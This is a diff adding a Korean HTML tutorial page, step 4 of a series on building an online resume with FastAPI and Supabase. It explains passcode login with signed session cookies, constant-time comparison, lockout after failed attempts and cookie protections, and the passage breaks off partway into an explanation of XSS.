@@ -1,0 +1,1054 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Step 4 — 내가 로그인해서 수정하기</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#ffffff; --bg-soft:#f7f8fa; --bg-code:#f4f5f7;
+    --fg:#1b1f24; --fg-soft:#5b6570; --fg-faint:#8b949e;
+    --line:#e3e6ea; --line-strong:#cfd4da;
+    --accent:#2f7d5d; --accent-bg:#eef7f2; --accent-line:#c4e2d3;
+    --warn:#946200;  --warn-bg:#fdf6e6;   --warn-line:#ecd9a8;
+    --danger:#a8352c;--danger-bg:#fdf0ee; --danger-line:#f2cec9;
+    --info:#245ea8;  --info-bg:#eef3fb;   --info-line:#c9dbf3;
+    --code-c:#4b8a5a;
+    --mono:ui-monospace,SFMono-Regular,"Cascadia Mono",Consolas,"D2Coding",monospace;
+  }
+  @media (prefers-color-scheme: dark){
+    :root{
+      --bg:#14171a; --bg-soft:#1b1f23; --bg-code:#1e2328;
+      --fg:#e7eaee; --fg-soft:#a4adb8; --fg-faint:#7b8592;
+      --line:#2a2f36; --line-strong:#3a414a;
+      --accent:#5fbf92; --accent-bg:#16241e; --accent-line:#2c4a3c;
+      --warn:#e0b155;  --warn-bg:#241f14;  --warn-line:#4a3d22;
+      --danger:#e8837a;--danger-bg:#261917; --danger-line:#4d302c;
+      --info:#77aef0;  --info-bg:#151f2c;  --info-line:#28405c;
+      --code-c:#7fb98a;
+    }
+  }
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%; scroll-behavior:smooth}
+  body{
+    margin:0; background:var(--bg); color:var(--fg);
+    font-family:"Noto Sans KR",sans-serif;
+    font-size:16px; line-height:1.78;
+    word-break:keep-all; overflow-wrap:anywhere;
+  }
+  .wrap{width:80%; min-width:340px; margin:0 auto; padding:48px 0 96px}
+  @media (max-width:900px){ .wrap{width:92%; padding:32px 0 64px} }
+
+  header.doc{border-bottom:2px solid var(--line-strong); padding-bottom:28px; margin-bottom:36px}
+  .eyebrow{color:var(--accent); font-weight:700; font-size:.82rem; letter-spacing:.09em; text-transform:uppercase; margin:0 0 10px}
+  h1{font-size:2rem; line-height:1.32; margin:0 0 14px; letter-spacing:-.02em; font-weight:700}
+  .lede{color:var(--fg-soft); margin:0; font-size:1rem}
+
+  h2{font-size:1.4rem; margin:60px 0 18px; padding-top:24px; border-top:1px solid var(--line); letter-spacing:-.01em; font-weight:700}
+  h2:first-of-type{border-top:none; padding-top:0}
+  h3{font-size:1.1rem; margin:36px 0 12px; letter-spacing:-.01em; font-weight:700}
+  h4{font-size:.98rem; margin:24px 0 9px; color:var(--fg-soft); font-weight:700}
+  p{margin:0 0 15px}
+  a{color:var(--accent)}
+  strong{font-weight:700}
+
+  .roadmap{background:var(--bg-soft); border:1px solid var(--line); border-radius:12px; padding:18px 22px; margin:0 0 8px}
+  .rm-row{display:flex; gap:14px; align-items:baseline; padding:7px 0; font-size:.95rem}
+  .rm-row + .rm-row{border-top:1px dashed var(--line)}
+  .rm-badge{flex:none; width:74px; font-weight:700; font-size:.78rem; color:var(--fg-faint); letter-spacing:.04em}
+  .rm-row.now .rm-badge{color:var(--accent)}
+  .rm-row.now{font-weight:700}
+  .rm-row.done{color:var(--fg-faint)}
+  .rm-now{color:var(--accent); font-size:.8rem; font-weight:700; margin-left:auto; flex:none}
+  .rm-done{color:var(--accent); font-size:.8rem; margin-left:auto; flex:none}
+
+  nav.toc{background:var(--bg-soft); border:1px solid var(--line); border-radius:12px; padding:18px 22px; margin:28px 0 8px}
+  nav.toc p{font-weight:700; margin:0 0 10px; font-size:.9rem; color:var(--fg-soft)}
+  nav.toc ol{margin:0; padding-left:1.3em; columns:2; column-gap:32px}
+  nav.toc li{margin:3px 0; font-size:.92rem; break-inside:avoid}
+  @media (max-width:640px){ nav.toc ol{columns:1} }
+
+  pre{
+    background:var(--bg-code); border:1px solid var(--line); border-radius:10px;
+    padding:15px 17px; overflow-x:auto; margin:0 0 16px; line-height:1.65;
+  }
+  code{font-family:var(--mono); font-size:.86em}
+  pre code{font-size:.83rem; white-space:pre; font-family:var(--mono)}
+  :not(pre) > code{background:var(--bg-code); border:1px solid var(--line); border-radius:5px; padding:.1em .38em; word-break:break-all}
+  .c{color:var(--code-c)}
+
+  /* ── 복사 버튼 ────────────────────────────── */
+  .pre-wrap{position:relative; margin:0 0 16px}
+  .pre-wrap[hidden]{display:none}
+  .pre-wrap pre{margin:0}
+  .copy{
+    position:absolute; top:8px; right:8px;
+    font-family:"Noto Sans KR",sans-serif; font-size:.72rem; font-weight:500;
+    padding:4px 10px; border-radius:6px; cursor:pointer; line-height:1.5;
+    border:1px solid var(--line-strong); background:var(--bg); color:var(--fg-soft);
+    opacity:0; transition:opacity .15s, color .15s, border-color .15s;
+  }
+  .pre-wrap:hover .copy, .copy:focus{opacity:1}
+  .copy:hover{color:var(--accent); border-color:var(--accent)}
+  .copy.done{color:var(--accent); border-color:var(--accent); opacity:1}
+  @media (hover:none){ .copy{opacity:.65} }
+
+  /* ── 파일 경로 라벨 ────────────────────────── */
+  .pre-file{
+    font-family:var(--mono); font-size:.7rem; color:var(--fg-faint);
+    padding:6px 14px 5px; background:var(--bg-soft);
+    border:1px solid var(--line); border-bottom:none;
+    border-radius:9px 9px 0 0; line-height:1.5;
+  }
+  pre.has-file{border-top-left-radius:0; border-top-right-radius:0}
+
+  /* ── diff 블록 ────────────────────────────── */
+  pre.diff{padding-left:0; padding-right:0}
+  pre.diff > code{display:block; min-width:100%}
+  pre.diff > code > div{
+    display:block; white-space:pre;
+    padding:0 17px 0 14px; border-left:3px solid transparent;
+  }
+  pre.diff > code > div.ctx{color:var(--fg-soft)}
+  pre.diff > code > div.del{background:var(--danger-bg); color:var(--danger); border-left-color:var(--danger)}
+  pre.diff > code > div.add{background:var(--accent-bg); color:var(--accent); border-left-color:var(--accent)}
+
+  /* ── shell tabs ───────────────────────────── */
+  .cmd{margin:0 0 18px}
+  .tabs{display:flex; gap:4px; flex-wrap:wrap; margin-bottom:-1px; position:relative; z-index:1}
+  .tab{
+    font-family:"Noto Sans KR",sans-serif; font-size:.8rem; font-weight:500;
+    padding:6px 14px; border:1px solid var(--line); border-bottom-color:transparent;
+    border-radius:8px 8px 0 0; background:var(--bg-soft); color:var(--fg-faint);
+    cursor:pointer; line-height:1.5;
+  }
+  .tab:hover{color:var(--fg-soft)}
+  .tab.on{background:var(--bg-code); color:var(--accent); font-weight:700; border-color:var(--line)}
+  .cmd pre{border-radius:0 10px 10px 10px; margin:0}
+  .cmd pre[hidden]{display:none}
+  .cmd .pre-wrap{margin:0}
+
+  .tw{overflow-x:auto; margin:0 0 20px; border:1px solid var(--line); border-radius:10px}
+  table{border-collapse:collapse; width:100%; font-size:.92rem; min-width:320px}
+  th,td{text-align:left; padding:11px 15px; border-bottom:1px solid var(--line); vertical-align:top}
+  thead th{background:var(--bg-soft); font-size:.85rem; color:var(--fg-soft); white-space:nowrap}
+  tbody tr:last-child td{border-bottom:none}
+
+  .box{
+    --bx:var(--info); --bx-bg:var(--info-bg); --bx-line:var(--info-line);
+    border:1px solid var(--bx-line); border-left:3px solid var(--bx);
+    background:var(--bx-bg); border-radius:4px 12px 12px 4px;
+    padding:17px 22px 18px; margin:0 0 22px;
+  }
+  .box .t{display:flex; align-items:center; gap:8px; font-weight:700; font-size:.92rem; color:var(--bx); margin:0 0 9px; line-height:1.5}
+  .box p{margin:0 0 11px; font-size:.94rem}
+  .box .tw{margin:12px 0; border-color:var(--bx-line)}
+  .box th,.box td{border-bottom-color:var(--bx-line)}
+  .box thead th{background:transparent}
+  .box pre{margin:12px 0; background:var(--bg); border-color:var(--bx-line)}
+  .box > :last-child{margin-bottom:0}
+  .box.warn  {--bx:var(--warn);   --bx-bg:var(--warn-bg);   --bx-line:var(--warn-line)}
+  .box.danger{--bx:var(--danger); --bx-bg:var(--danger-bg); --bx-line:var(--danger-line)}
+  .box.ok    {--bx:var(--accent); --bx-bg:var(--accent-bg); --bx-line:var(--accent-line)}
+
+  details.q{
+    border:1px solid var(--line); border-radius:12px;
+    background:var(--bg-soft); margin:0 0 20px; overflow:hidden;
+    transition:border-color .15s, background .15s;
+  }
+  details.q:hover{border-color:var(--accent-line); background:var(--accent-bg)}
+  details.q[open]{background:var(--bg-soft); border-color:var(--accent-line)}
+  details.q > summary{
+    cursor:pointer; list-style:none; display:flex; align-items:center; gap:11px;
+    padding:14px 18px; font-weight:700; font-size:.95rem; color:var(--accent);
+  }
+  details.q > summary::-webkit-details-marker{display:none}
+  .q-ic{
+    flex:none; width:21px; height:21px; border-radius:50%;
+    background:var(--accent); color:var(--bg);
+    display:grid; place-items:center; font-size:.76rem; font-weight:700;
+    font-family:var(--mono); line-height:1;
+  }
+  .q-ch{margin-left:auto; flex:none; color:var(--fg-faint); font-size:.72rem; transition:transform .18s}
+  details.q[open] .q-ch{transform:rotate(180deg)}
+  .q-body{padding:15px 20px 18px; border-top:1px solid var(--line); background:var(--bg)}
+  .q-body > :last-child{margin-bottom:0}
+  .q-body p{font-size:.94rem}
+
+  details.tb{
+    border:1px solid var(--danger-line); border-left:3px solid var(--danger);
+    background:var(--danger-bg); border-radius:4px 12px 12px 4px;
+    margin:0 0 20px; overflow:hidden;
+  }
+  details.tb > summary{cursor:pointer; list-style:none; position:relative; padding:13px 46px 14px 20px}
+  details.tb > summary::-webkit-details-marker{display:none}
+  details.tb > summary::after{
+    content:"▾"; position:absolute; right:20px; top:50%;
+    transform:translateY(-50%); color:var(--danger); font-size:.78rem; transition:transform .18s;
+  }
+  details.tb[open] > summary::after{transform:translateY(-50%) rotate(180deg)}
+  .tb-lab{display:block; font-family:var(--mono); font-size:.66rem; font-weight:700; letter-spacing:.17em; color:var(--danger); margin-bottom:4px}
+  .tb-tit{display:block; font-weight:700; font-size:.94rem; color:var(--fg); line-height:1.6}
+  .tb-body{padding:16px 20px 20px; border-top:1px solid var(--danger-line); background:var(--bg)}
+  .tb-body > :last-child{margin-bottom:0}
+  .tb-body h4:first-child{margin-top:0}
+
+  ul,ol{margin:0 0 16px; padding-left:1.4em}
+  li{margin:6px 0}
+  blockquote{
+    margin:0 0 18px; padding:2px 0 2px 18px; border-left:3px solid var(--line-strong);
+    color:var(--fg-soft); font-size:.95rem;
+  }
+  blockquote p:last-child{margin-bottom:0}
+  .foot{margin-top:60px; padding-top:20px; border-top:1px solid var(--line); color:var(--fg-faint); font-size:.85rem}
+  .navlinks{display:flex; gap:12px; flex-wrap:wrap; margin:32px 0 0}
+  .navlinks a{
+    flex:1; min-width:220px; text-decoration:none; color:inherit;
+    border:1px solid var(--line); border-radius:12px; padding:14px 18px; background:var(--bg-soft);
+  }
+  .navlinks a:hover{border-color:var(--accent)}
+  .navlinks .k{display:block; font-size:.75rem; color:var(--fg-faint); letter-spacing:.06em; margin-bottom:3px}
+  .navlinks .v{display:block; font-weight:700; font-size:.95rem; color:var(--accent)}
+
+  @media print{
+    body{font-size:11pt} .wrap{width:auto;min-width:0;padding:0}
+    details.tb,details.q,.box,pre,.tw{break-inside:avoid} h2{break-after:avoid}
+    details.tb > summary::after,.q-ch{display:none}
+    nav.toc{display:none} .tabs{display:none} .cmd pre{border-radius:10px}
+    .cmd pre[hidden]{display:block !important}
+    .pre-wrap[hidden]{display:block !important}
+    .copy{display:none}
+    details:not([open]) > *{display:block !important}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="doc">
+  <p class="eyebrow">MyHub · 온라인 이력서 만들기</p>
+  <h1>Step 4 — 내가 로그인해서 수정하기</h1>
+  <p class="lede">Supabase 대시보드에 들어가지 않고, 웹에서 이력서를 고칩니다. · 2026-07-28</p>
+</header>
+
+<div class="roadmap">
+  <div class="rm-row done"><span class="rm-badge">STEP 1</span><span>백엔드 ↔ Supabase 연결</span><span class="rm-done">✓ 완료</span></div>
+  <div class="rm-row done"><span class="rm-badge">STEP 2</span><span>테이블 만들고 데이터 읽기</span><span class="rm-done">✓ 완료</span></div>
+  <div class="rm-row done"><span class="rm-badge">STEP 3</span><span>화면(프론트엔드) 붙이기</span><span class="rm-done">✓ 완료</span></div>
+  <div class="rm-row now"><span class="rm-badge">STEP 4</span><span>내가 로그인해서 수정하기</span><span class="rm-now">← 지금 여기</span></div>
+  <div class="rm-row"><span class="rm-badge">STEP 5</span><span>ORM 도입 (SQLAlchemy)</span></div>
+</div>
+
+<nav class="toc">
+  <p>목차</p>
+  <ol>
+    <li><a href="#s1">이 단계의 목표</a></li>
+    <li><a href="#s2">완성된 모습</a></li>
+    <li><a href="#s3">① 백엔드 로그인</a></li>
+    <li><a href="#s4">쿠키 — 핵심 개념</a></li>
+    <li><a href="#s5">② 로그인 화면</a></li>
+    <li><a href="#s6">③ 수정 기능</a></li>
+    <li><a href="#s7">④ 정리</a></li>
+    <li><a href="#s8">개념 정리</a></li>
+    <li><a href="#s9">다음 단계</a></li>
+  </ol>
+</nav>
+
+<div class="box" style="margin-top:26px">
+  <p class="t">🖥️ 이 문서를 읽는 법</p>
+  <p>명령어 블록마다 <strong>cmd / PowerShell / macOS·Linux</strong> 탭이 있습니다. 코드 블록 위에는 <strong>어떤 파일인지</strong>가 표시되고, 마우스를 올리면 <strong>복사</strong> 버튼이 나타납니다.</p>
+  <p><span style="color:var(--accent);font-weight:700">?</span> 초록 패널은 <strong>"이게 뭔가요?"에 대한 답</strong>, <span style="color:var(--danger);font-family:var(--mono);font-size:.72rem;font-weight:700;letter-spacing:.14em">TROUBLESHOOTING</span> 붉은 패널은 <strong>에러가 났을 때</strong> 보는 곳입니다.</p>
+  <p>이전 문서: <a href="step3_react_frontend.html">Step 3 — 화면 붙이기 (React + TypeScript)</a></p>
+</div>
+
+<h2 id="s1">1. 이 단계의 목표</h2>
+
+<div class="box ok">
+  <p class="t">🎯 목표</p>
+  <p><strong>Supabase 대시보드에 들어가지 않고, 웹에서 이력서를 고칠 수 있게 만드는 것.</strong></p>
+</div>
+
+<pre><code>[Step 3]  내용을 바꾸려면 → Supabase SQL Editor 에서 UPDATE 실행
+[Step 4]  이력서 화면에서 로그인 → 그 자리에서 고치고 → 저장</code></pre>
+
+<h3>네 조각으로 나눠서 진행합니다</h3>
+<div class="tw"><table>
+<thead><tr><th></th><th>하는 일</th><th>확인 방법</th></tr></thead>
+<tbody>
+<tr><td><strong>①</strong></td><td>백엔드 로그인 (비밀코드 → 세션 쿠키)</td><td><code>/docs</code> 에서 직접 테스트</td></tr>
+<tr><td><strong>②</strong></td><td>로그인 입구 + 제자리 편집으로 전환</td><td>브라우저에서 로그인</td></tr>
+<tr><td><strong>③</strong></td><td>수정 API + 제자리 편집</td><td>화면에서 고치고 저장</td></tr>
+<tr><td><strong>④</strong></td><td>정리 (세션 만료 처리 등)</td><td>쿠키 지우고 저장해보기</td></tr>
+</tbody>
+</table></div>
+
+<h3>이번 단계에서 처음 등장하는 것</h3>
+<div class="tw"><table>
+<tbody>
+<tr><td><strong>쿠키와 세션</strong></td><td>Step 3의 5.8에서 예고한 <code>httpOnly</code>, <code>SameSite</code> 가 실전으로</td></tr>
+<tr><td><strong>쓰기 요청 (<code>PUT</code>)</strong></td><td>읽기만 하던 앱이 처음으로 데이터를 바꿉니다</td></tr>
+<tr><td><strong>폼</strong></td><td>입력값 관리, 검증, 저장 중 상태, 되돌리기</td></tr>
+<tr><td><strong>한 화면 두 모드</strong></td><td>같은 주소에서 읽기 ↔ 편집 전환</td></tr>
+</tbody>
+</table></div>
+
+<h2 id="s2">2. 완성된 모습</h2>
+<p><strong>편집용 페이지를 따로 만들지 않습니다.</strong> 보고 있던 이력서 화면에서 그대로 고칩니다.</p>
+<pre><code><span class="c">[로그아웃]  http://localhost:5173</span>
+┌──────────────────────────────────────┐
+│  백영민                               │
+│  백엔드 개발자                         │
+│  온라인 이력서를 직접 만들고 있습니다.   │
+│  ──────────────────────────────────  │
+│  마지막 수정 2026년 7월 28일  관리자 로그인 │  <span class="c">← 여기를 누르면</span>
+└──────────────────────────────────────┘
+
+<span class="c">[로그인]   같은 주소, 같은 화면</span>
+┌──────────────────────────────────────┐
+│ 편집 모드 — 글자를 눌러 바로 고치세요     │  <span class="c">← 위에 도구막대가 붙고</span>
+│              [되돌리기][저장][로그아웃]  │
+├──────────────────────────────────────┤
+│  ┌──────────────────────────────┐    │
+│  │ 백영민                        │    │  <span class="c">← 글자가 있던 자리가</span>
+│  └──────────────────────────────┘    │     <span class="c">그대로 입력칸이 된다</span>
+│  ┌──────────────────────────────┐    │
+│  │ 백엔드 개발자                  │    │
+│  └──────────────────────────────┘    │
+│  ──────────────────────────────────  │
+│  ┌──────────────────────────────┐    │
+│  │ 온라인 이력서를 직접 만들고... │    │
+│  └──────────────────────────────┘    │
+└──────────────────────────────────────┘</code></pre>
+
+<details class="q">
+<summary><span class="q-ic">?</span>왜 편집 페이지를 따로 두지 않았나요<span class="q-ch">▾</span></summary>
+<div class="q-body">
+<p>별도 페이지를 만들면 <strong>"편집 화면에서 본 모습"과 "실제 공개된 모습"이 달라집니다.</strong> 폼에서는 멀쩡했는데 공개 화면에서 줄바꿈이 이상하다든가 하는 일이 생기죠.</p>
+<p>같은 화면에서 고치면 <strong>지금 보는 것이 곧 결과물</strong>입니다. 글꼴도 여백도 그대로예요.</p>
+</div>
+</details>
+
+<p><code>Ctrl + S</code> 로도 저장됩니다. 저장하지 않은 채로 탭을 닫으려 하면 브라우저가 한 번 물어봅니다.</p>
+
+<h2 id="s3">3. ① 백엔드 로그인</h2>
+
+<h3>3.1 인증 설계</h3>
+<pre><code>POST   /api/admin/auth/session   비밀코드 보내기  →  쿠키 받음
+GET    /api/admin/auth/session   로그인 상태 확인
+DELETE /api/admin/auth/session   로그아웃</code></pre>
+<p><strong>비밀코드는 로그인할 때 딱 한 번만 씁니다.</strong> 그다음부터는 서명된 쿠키로 인증해요.</p>
+
+<details class="q">
+<summary><span class="q-ic">?</span>왜 매 요청에 비밀코드를 보내면 안 되나요<span class="q-ch">▾</span></summary>
+<div class="q-body">
+<p>로그·프록시·브라우저 기록에 계속 남고, <strong>만료도 폐기도 불가능</strong>해집니다. 한 번 유출되면 비밀코드를 바꾸는 수밖에 없어요.</p>
+<p>쿠키는 만료 시간이 있고, 로그아웃으로 즉시 무효화됩니다.</p>
+</div>
+</details>
+
+<h3>3.2 패키지와 환경변수</h3>
+<pre data-file="backend/requirements.txt"><code>itsdangerous</code></pre>
+
+<pre data-file="backend/.env"><code>ADMIN_PASSCODE='내가정한비밀코드'
+SESSION_SECRET=아래명령으로만든64자리</code></pre>
+
+<p><code>SESSION_SECRET</code> 만들기:</p>
+<div class="cmd">
+  <div class="tabs">
+    <button class="tab" data-shell="cmd">cmd</button>
+    <button class="tab" data-shell="ps">PowerShell</button>
+    <button class="tab" data-shell="sh">macOS / Linux</button>
+  </div>
+  <pre data-shell="cmd"><code>python -c "import secrets; print(secrets.token_hex(32))"</code></pre>
+  <pre data-shell="ps"><code>python -c "import secrets; print(secrets.token_hex(32))"</code></pre>
+  <pre data-shell="sh"><code>python3 -c "import secrets; print(secrets.token_hex(32))"</code></pre>
+</div>
+
+<p>설치 후 재시작:</p>
+<div class="cmd">
+  <div class="tabs">
+    <button class="tab" data-shell="cmd">cmd</button>
+    <button class="tab" data-shell="ps">PowerShell</button>
+    <button class="tab" data-shell="sh">macOS / Linux</button>
+  </div>
+  <pre data-shell="cmd"><code>pip install -r requirements.txt
+uvicorn main:app --reload --port 8080</code></pre>
+  <pre data-shell="ps"><code>pip install -r requirements.txt
+uvicorn main:app --reload --port 8080</code></pre>
+  <pre data-shell="sh"><code>pip install -r requirements.txt
+uvicorn main:app --reload --port 8080</code></pre>
+</div>
+
+<details class="tb">
+<summary>
+  <span class="tb-lab">TROUBLESHOOTING</span>
+  <span class="tb-tit"><code>KeyError: 'ADMIN_PASSCODE'</code></span>
+</summary>
+<div class="tb-body">
+<h4>원인</h4>
+<p><code>.env</code> 에 그 항목이 없습니다.</p>
+<div class="box ok">
+  <p class="t">✅ 이건 의도된 동작입니다</p>
+  <p><code>os.environ["..."]</code> 는 값이 없으면 서버를 아예 시작시키지 않습니다. 비밀값이 빠진 채로 조용히 실행되는 것보다, <strong>시작할 때 크게 실패하는 편이 안전</strong>합니다.</p>
+</div>
+<h4>해결</h4>
+<p><code>backend/.env</code> 를 열어 두 줄을 추가하세요. <code>.env.example</code> 에 양식이 있습니다.</p>
+</div>
+</details>
+
+<details class="tb">
+<summary>
+  <span class="tb-lab">TROUBLESHOOTING</span>
+  <span class="tb-tit">비밀코드에 특수문자를 넣었더니 안 맞는다</span>
+</summary>
+<div class="tb-body">
+<h4>해결 — 작은따옴표로 감싸세요</h4>
+<pre data-file="backend/.env"><code>ADMIN_PASSCODE='a#b$c%d!'</code></pre>
+<p>입력할 때는 따옴표를 뺀 <code>a#b$c%d!</code> 입니다.</p>
+<h4>함정 3가지</h4>
+<div class="tw"><table>
+<thead><tr><th>문자</th><th>무슨 일이 일어나나</th></tr></thead>
+<tbody>
+<tr><td><code>#</code> (앞에 공백)</td><td>그 뒤가 <strong>주석으로 잘림</strong> — <code>abc #def</code> → 값이 <code>abc</code></td></tr>
+<tr><td><code>${...}</code></td><td><strong>다른 환경변수로 치환됨</strong> — <code>abc${HOME}</code> → <code>abcC:\Users\...</code></td></tr>
+<tr><td>한글·이모지</td><td><code>secrets.compare_digest</code> 가 <strong>비ASCII 문자열 비교를 거부</strong>함</td></tr>
+</tbody>
+</table></div>
+<p>세 번째는 코드에서 처리했습니다. 문자열이 아니라 바이트로 비교하면 됩니다.</p>
+<pre data-file="backend/main.py"><code>if not secrets.compare_digest(
+    body.passcode.encode("utf-8"), ADMIN_PASSCODE.encode("utf-8")
+):</code></pre>
+<blockquote><p><code>%</code> 는 <code>.env</code> 에서 아무 의미가 없어 안전합니다. (Windows cmd 의 <code>%VAR%</code> 는 cmd 에 직접 칠 때만 해당됩니다.)</p></blockquote>
+</div>
+</details>
+
+<h3>3.3 쿠키 설정</h3>
+<pre data-file="backend/main.py"><code>from starlette.middleware.sessions import SessionMiddleware
+
+app.add_middleware(
+    SessionMiddleware,
+    secret_key=SESSION_SECRET,
+    session_cookie="myhub_session",
+    max_age=60 * 60 * 12,   <span class="c"># 12시간</span>
+    same_site="lax",
+    https_only=False,       <span class="c"># 배포할 때 True</span>
+)</code></pre>
+
+<h3>3.4 문지기</h3>
+<pre data-file="backend/main.py"><code>def require_admin(request: Request) -&gt; None:
+    """관리자 전용 엔드포인트에 붙이는 문지기.
+
+    이 함수 하나만 바꾸면 나중에 인증 방식을 통째로 교체할 수 있다.
+    """
+    if not request.session.get("admin"):
+        raise HTTPException(status_code=401, detail="로그인이 필요합니다.")</code></pre>
+
+<pre data-file="backend/main.py"><code>@app.get("/api/admin/profile", dependencies=[Depends(require_admin)])</code></pre>
+
+<p><strong><code>dependencies=[Depends(require_admin)]</code> 한 줄</strong>을 붙이면 그 주소는 로그인 필수가 됩니다.</p>
+<p>나중에 GitHub 로그인 등으로 바꾸고 싶어지면 <strong><code>require_admin</code> 함수 하나만</strong> 갈아끼우면 됩니다. 나머지 코드는 손대지 않아요.</p>
+
+<h3>3.5 로그인 처리</h3>
+<pre data-file="backend/main.py"><code>@app.post("/api/admin/auth/session", response_model=SessionResponse)
+def login(body: LoginRequest, request: Request):
+    global _login_fail_count, _login_locked_until
+
+    now = time.monotonic()
+    if now &lt; _login_locked_until:
+        raise HTTPException(status_code=429, detail="시도가 너무 많습니다...")
+
+    if not secrets.compare_digest(
+        body.passcode.encode("utf-8"), ADMIN_PASSCODE.encode("utf-8")
+    ):
+        _login_fail_count += 1
+        if _login_fail_count &gt;= LOGIN_MAX_ATTEMPTS:
+            _login_locked_until = now + LOGIN_LOCK_SECONDS
+            _login_fail_count = 0
+        raise HTTPException(status_code=401, detail="비밀코드가 올바르지 않습니다.")
+
+    _login_fail_count = 0
+    request.session["admin"] = True
+    return SessionResponse(authenticated=True)</code></pre>
+
+<details class="q">
+<summary><span class="q-ic">?</span><code>secrets.compare_digest</code> 는 왜 쓰나요? <code>==</code> 로 하면 안 되나요<span class="q-ch">▾</span></summary>
+<div class="q-body">
+<p><code>==</code> 는 <strong>다른 글자가 나오는 즉시 멈춥니다.</strong></p>
+<pre><code>정답: "abcdef"
+
+"xxxxxx" 와 비교 → 1글자 만에 끝     <span class="c">(빠름)</span>
+"abcdex" 와 비교 → 6글자까지 감      <span class="c">(아주 조금 느림)</span></code></pre>
+<p>이 시간 차이를 수천 번 측정하면 <strong>한 글자씩 맞춰나갈 수 있습니다.</strong> 이걸 타이밍 공격이라고 합니다.</p>
+<p><code>compare_digest</code> 는 <strong>항상 끝까지 비교</strong>해서 걸리는 시간이 일정합니다. 한 줄 바꾸는 것으로 이 공격이 사라집니다.</p>
+</div>
+</details>
+
+<details class="q">
+<summary><span class="q-ic">?</span>시도 횟수 제한이 왜 필요한가요<span class="q-ch">▾</span></summary>
+<div class="q-body">
+<p>비밀코드가 6자리라면 경우의 수가 얼마 안 됩니다. <strong>컴퓨터는 초당 수천 번 시도할 수 있어요.</strong></p>
+<pre data-file="backend/main.py"><code>LOGIN_MAX_ATTEMPTS = 5
+LOGIN_LOCK_SECONDS = 60</code></pre>
+<p>5번 틀리면 60초 잠급니다. 초당 수천 번이 <strong>분당 5번</strong>으로 줄어들면, 6자리 코드를 다 시도하는 데 수백 년이 걸립니다.</p>
+<blockquote><p>지금은 서버 메모리에 숫자를 세는 방식이라 서버를 재시작하면 초기화됩니다. 프로토타입에는 충분하지만, 서버를 여러 대로 늘리면 공유 저장소(Redis 등)가 필요합니다.</p></blockquote>
+</div>
+</details>
+
+<h3>3.6 <code>/docs</code> 에서 테스트</h3>
+<p><strong><code>http://127.0.0.1:8080/docs</code></strong> 에서 순서대로:</p>
+<div class="tw"><table>
+<thead><tr><th></th><th>요청</th><th>기대 결과</th></tr></thead>
+<tbody>
+<tr><td>①</td><td><code>GET /api/admin/profile</code></td><td><code>401 로그인이 필요합니다</code></td></tr>
+<tr><td>②</td><td><code>POST /api/admin/auth/session</code> (비밀코드)</td><td><code>200 {"authenticated": true}</code></td></tr>
+<tr><td>③</td><td><code>GET /api/admin/profile</code></td><td><code>200 {"profile": {...}}</code></td></tr>
+<tr><td>④</td><td><code>DELETE /api/admin/auth/session</code></td><td><code>200 {"authenticated": false}</code></td></tr>
+<tr><td>⑤</td><td><code>GET /api/admin/profile</code></td><td><code>401</code> 다시</td></tr>
+<tr><td>⑥</td><td>틀린 비밀코드 6번</td><td>6회째부터 <code>429</code></td></tr>
+</tbody>
+</table></div>
+
+<div class="box ok">
+  <p class="t">✅ ③이 이 단계의 핵심입니다</p>
+  <p><strong>아무것도 안 바꿨는데 통과합니다.</strong> 브라우저가 ②에서 받은 쿠키를 자동으로 붙여 보냈기 때문입니다.</p>
+</div>
+
+<h2 id="s4">4. 쿠키 — 이번 단계의 핵심 개념</h2>
+
+<h3>4.1 쿠키가 뭔가</h3>
+<p>서버가 브라우저에게 주는 <strong>쪽지</strong>입니다.</p>
+<blockquote><p>"이거 갖고 있다가, 다음에 나한테 올 때 같이 보여줘."</p></blockquote>
+<p>브라우저는 이 쪽지를 <strong>알아서 저장하고, 알아서 붙여 보냅니다.</strong> 우리 코드에는 토큰을 저장하거나 꺼내는 부분이 한 줄도 없습니다.</p>
+<pre data-file="frontend/src/api/client.ts"><code>export async function login(passcode: string) {
+  const { data } = await client.POST('/api/admin/auth/session', {
+    body: { passcode },
+  })
+  return data          <span class="c">// ← 받아서 어딘가 넣는 코드가 없다</span>
+}</code></pre>
+
+<h3>4.2 왜 새로고침해도 로그인이 유지되나</h3>
+<p>이게 이 단계에서 가장 재미있는 지점입니다.</p>
+<pre><code>새로고침
+  → React 가 기억하던 것은 전부 사라짐   <span class="c">(authenticated 값도 초기화)</span>
+  → 하지만 쿠키는 브라우저가 보관 중
+  → readSession() 호출 시 쿠키가 자동으로 따라감
+  → 서버: "응, 로그인된 사람 맞아"
+  → 화면 복구</code></pre>
+<div class="box ok">
+  <p class="t">🍪 한 문장으로</p>
+  <p><strong>화면의 기억은 날아가도, 브라우저의 쪽지는 남아 있습니다.</strong> 그래서 로그인 상태가 이어집니다.</p>
+  <p>브라우저를 완전히 껐다 켜도 마찬가지입니다 — <code>max_age</code>(우리는 12시간) 안이라면요.</p>
+</div>
+
+<h3>4.3 우리가 준 4가지 보호 장치</h3>
+<div class="tw"><table>
+<thead><tr><th>장치</th><th>막아주는 것</th></tr></thead>
+<tbody>
+<tr><td><code>httpOnly</code> (기본값)</td><td><strong>XSS 로 세션을 훔쳐가는 것</strong></td></tr>
+<tr><td><code>same_site="lax"</code></td><td><strong>CSRF — 남의 사이트에서 내 이름으로 요청 보내기</strong></td></tr>
+<tr><td><code>https_only</code></td><td>중간에서 쪽지를 가로채는 것 (배포 시 필수)</td></tr>
+<tr><td>서명 (<code>secret_key</code>)</td><td>쪽지 내용을 위조하는 것</td></tr>
+</tbody>
+</table></div>
+
+<details class="q">
+<summary><span class="q-ic">?</span>XSS 가 뭔가요<span class="q-ch">▾</span></summary>
+<div class="q-body">
+<p><strong>Cross-Site Scripting</strong> — 내 페이지에서 <strong>남의 자바스크립트가 실행되는</strong> 사고입니다.</p>
